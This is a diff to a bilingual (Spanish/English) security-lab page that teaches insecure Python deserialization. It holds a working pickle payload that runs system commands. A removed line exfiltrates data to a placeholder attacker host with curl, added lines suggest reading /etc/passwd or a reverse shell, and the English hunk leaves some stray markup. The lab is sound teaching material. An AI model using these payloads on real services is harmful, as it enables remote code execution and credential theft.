@@ -53,20 +53,20 @@
     <h3>¿Qué es la deserialización insegura?</h3>
     <ol>
       <li>Python's <code>pickle.loads()</code> ejecuta código Python arbitrario al deserializar objetos.</li>
-      <li>Crea un payload malicioso que ejecute un comando del sistema:</li>
+      <li>Crea un payload malicioso que ejecute un comando y devuelva su salida (usa <code>subprocess.check_output</code> para ver el resultado en el navegador):</li>
     </ol>
-    <pre>import pickle as pkl, base64, os
+    <pre>import pickle as pkl, base64, subprocess
 
 class Exploit(object):
     def __reduce__(self):
-        return (os.system, ('id',))
+        return (subprocess.check_output, (['id'],))
 
 payload = base64.b64encode(pkl.dumps(Exploit())).decode()
 print(payload)</pre>
     <ol start="3">
       <li>No llames tu script <code>pickle.py</code> (sombrea el modulo estandar). Usa por ejemplo <code>exploit_pickle.py</code> y ejecuta: <code>python3 exploit_pickle.py</code>.</li>
-      <li>Envía el payload al formulario. El servidor ejecutará <code>os.system('id')</code>.</li>
-      <li>Cambia <code>'id'</code> por cualquier comando: <code>'curl http://ATTACKER/$(whoami)'</code>, reverse shell, etc.</li>
+      <li>Envía el payload al formulario. El servidor ejecutará <code>id</code> y mostrará la salida.</li>
+      <li>Cambia <code>'id'</code> por cualquier comando: <code>'cat /etc/passwd'</code>, reverse shell, etc.</li>
       <li>Cuando el payload alcanza primitivas de ejecución, el lab muestra la flag dedicada del laboratorio.</li>
       <li>Genera payload con <strong>ysoserial</strong> (Java) o scripts similares para otros lenguajes.</li>
     </ol>
@@ -77,7 +77,24 @@ print(payload)</pre>
     <h3>What is Insecure Deserialization?</h3>
     <ol>
       <li>Python's <code>pickle.loads()</code> executes arbitrary Python code when deserializing objects.</li>
-      <li>Create a malicious payload that runs a system command:</li>
+      <li>Create a malicious payload that runs a system command and returns its output (use <code>subprocess.check_output</code> to see the result in the browser):</li></ol>
+    <pre>import pickle as pkl, base64, subprocess
+
+class Exploit(object):
+    def __reduce__(self):
+        return (subprocess.check_output, (['id'],))
+
+payload = base64.b64encode(pkl.dumps(Exploit())).decode()
+print(payload)</pre>
+    <ol start="3">
+      <li>Do not name your script <code>pickle.py</code> (it shadows the stdlib module). Use <code>exploit_pickle.py</code> and run: <code>python3 exploit_pickle.py</code>.</li>
+      <li>Submit the payload via the form. The server will execute <code>id</code> and display the output.</li>
+      <li>Replace <code>'id'</code> with any command: <code>cat /etc/passwd</code>, reverse shell, etc.</li>
+      <li>When code execution primitives are reached, the lab displays the dedicated flag.</li>
+      <li>Generate payloads with <strong>ysoserial</strong> (Java) or similar tools for other languages.</li>
+    </ol>
+    <h3>Tools</h3>
+    <div><span class="tools-badge">python3</span> <span class="tools-badge">Burp Suite</span> <span class="tools-badge">ysoserial</span></div>
     </ol>
     <pre>import pickle as pkl, base64, os
 
